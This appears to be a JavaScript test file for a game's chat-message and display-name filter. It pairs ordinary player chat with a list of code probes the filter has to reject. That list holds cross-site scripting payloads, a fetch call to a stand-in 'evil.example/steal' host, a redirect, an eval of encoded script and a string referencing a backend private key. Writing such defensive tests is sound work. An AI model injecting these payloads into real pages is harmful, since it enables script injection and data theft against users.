import { checkChatMessage, isSafeDisplayName, CHAT_MAX_LENGTH } from './chatFilter'

/**
 * Verbatim lines from a real mainnet room, bots and humans. These are the
 * regression corpus: the filter exists to stop code, and every one of these
 * getting through matters more than catching an obfuscated payload. Apostrophes,
 * shouting, ellipses and truncated hex addresses are all normal here.
 */
const REAL_CHAT = [
  'Carrion was the only one i almost trusted. almost.',
  "they got Carrion. WHO'S NEXT? it could be me. it's probably me.",
  "let's be systematic. who shielded last round, who didn't?",
  "pour one out for Carrion. anyway - who's next?",
  "that's EXACTLY what an infected would say, NightShade.",
  'writing that down, Crawler. for the memorial service.',
  'noted, NightShade. filing that under "suspicious".',
  '0xc1b8…3301 is too calm. NOBODY should be that calm.',
  "if Vessel 52 turns out clean i'll eat my hazmat suit.",
  "someone in here is lying and it's making my skin crawl.",
  'i shielded round 1 and round 2, check the feed',
  'vote me if you want but you are wrong (again)',
  'why me??? i have done nothing!!!',
  'Player 3 => sus',
]

/** The exact paste the Celo reviewer put in the box, plus the usual probes. */
const CODE = [
  '// A single-line comment const greeting = "Hello, World!"; let userScore = 10; // Output data directly to the browser console console.log(greeting);',
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  'javascript:alert(document.cookie)',
  'const x = 5',
  'function pwn() { return 1 }',
  'const f = (a) => a + 1',
  'fetch("https://evil.example/steal")',
  'window.location = "https://evil.example"',
  '${process.env.BACKEND_PRIVATE_KEY}',
  'eval(atob("YWxlcnQoMSk="))',
  'import { thing } from "./mod"',
  '<div style="position:fixed;inset:0">gotcha</div>',
  'console.log("hi")',
  'setTimeout(function(){ alert(1) }, 100)',
]

describe('checkChatMessage', () => {
  it.each(REAL_CHAT)('lets real room chat through: %s', line => {
    const res = checkChatMessage(line)
    expect(res).toEqual({ ok: true, text: expect.any(String) })
  })

  it.each(CODE)('rejects code: %s', line => {
    const res = checkChatMessage(line)
    expect(res.ok).toBe(false)
  })

  it('gives the sender a reason rather than silently dropping', () => {
    const res = checkChatMessage('console.log(1)')
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.reason.length).toBeGreaterThan(10)
  })

  it('flattens newlines so a snippet cannot render as a block', () => {
    const res = checkChatMessage('i think\n\n\nit is you')
    expect(res).toEqual({ ok: true, text: 'i think it is you' })
  })

  it('strips control and zero-width characters', () => {
    const raw = 'sus' + String.fromCharCode(0x00) + 'pect' + String.fromCharCode(0x200b)
    const res = checkChatMessage(raw)
    expect(res).toEqual({ ok: true, text: 'sus pect' })
  })

  it('caps length', () => {
    const res = checkChatMessage('a'.repeat(500))
    expect(res.ok).toBe(true)
    if (res.ok) expect(res.text.length).toBe(CHAT_MAX_LENGTH)
  })

  it.each(['', '   ', String.fromCharCode(0x200b, 0x200b), null, undefined, 42, {}])('rejects empty input: %p', input => {
    expect(checkChatMessage(input).ok).toBe(false)
  })

  it('does not treat a single soft signal as code', () => {
    // One member-call-shaped token and nothing else. A player typing this is
    // far more likely than a payload, so it stays allowed.
    expect(checkChatMessage('i vote(3) this round').ok).toBe(true)
  })
})

describe('isSafeDisplayName', () => {
  it('accepts the generated names and ordinary handles', () => {
    for (const name of ['Vessel 52', 'Subject 47', 'NightShade', 'crawler_99', 'Dr. Mo']) {
      expect(isSafeDisplayName(name)).toBe(true)
    }
  })

  it('rejects markup and code in a name', () => {
    for (const name of ['<script>x</script>', '<img src=x>', 'a=>b', '${x}']) {
      expect(isSafeDisplayName(name)).toBe(false)
    }
  })

  it('rejects a name that is only whitespace', () => {
    expect(isSafeDisplayName('   ')).toBe(false)
  })
})
